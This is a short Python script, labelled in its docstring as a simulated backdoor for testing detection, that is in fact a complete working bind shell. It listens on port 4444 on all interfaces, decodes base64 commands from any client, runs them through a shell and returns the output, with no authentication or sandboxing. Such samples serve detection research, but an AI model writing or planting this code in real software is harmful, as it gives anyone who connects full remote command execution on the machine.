"""Simulated backdoor for testing detection"""
import socket
import base64
import os
import subprocess

def setup_backdoor():
    # Listen for incoming connections
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 4444))
    sock.listen(5)

    while True:
        conn, addr = sock.accept()
        # Receive encoded command
        data = conn.recv(1024)
        cmd = base64.b64decode(data).decode()

        # Execute command
        result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        output = result.stdout.read()

        # Send back encoded response
        encoded = base64.b64encode(output)
        conn.send(encoded)
        conn.close()

if __name__ == "__main__":
    setup_backdoor()
